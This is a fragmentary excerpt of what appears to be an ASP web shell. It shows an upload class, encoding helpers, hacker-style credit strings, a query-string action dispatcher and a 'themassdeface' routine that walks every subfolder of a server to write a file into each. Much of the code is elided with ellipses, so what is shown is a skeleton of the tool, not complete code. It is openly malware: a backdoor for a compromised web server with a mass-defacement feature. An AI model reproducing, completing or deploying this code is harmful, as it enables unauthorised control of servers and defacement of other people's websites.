...
Class UploadedFile
	...
	End Sub
End Class
startcode = "<html><head><title></title></head><body>"
endocde = "</body></html>"
...
Function HexConv(hexVar)
	Dim hxx, hxx_var, multiply          
         ...
         END IF
End Function
cprthtml = "<font face='arial' size='1'>p<a href='mailto:'>p</a> - <a href='' target='_blank'>_$3r\/3R</a> ::.</font>"
Dim Base64Chars
...
keydec="<font face='arial' size='1'>y<a href='mailto:'>P0Uy@_$3r\/3R</a> - <a href='' target='_blank'></a> ::.</font>"
...
Select Case Trim(Request.QueryString("action"))
	...
	Case "mass"
		...
		Sub themassdeface(caminhodomass,metodo,ObjFSO,MeuArquivo)
			...
			Set ColFolders = MonRep.SubFolders
			for each folderItem in ColFolders
				destino1 = folderItem.path & "\ads.txt"
				destino2 = folderItem.path & "\ads.txt"
				destino3 = folderItem.path & "\ads.txt"
				destino4 = folderItem.path & "\ads.txt"
				destino5 = folderItem.path & "\ads.txt"
				destino6 = folderItem.path & "\ads.txt"
				destino7 = folderItem.path & "\ads.txt"
				destino8 = folderItem.path & "\ads.txt"
				destino9 = folderItem.path & "\ads.txt"
				destino10 = folderItem.path & "\ads.txt"
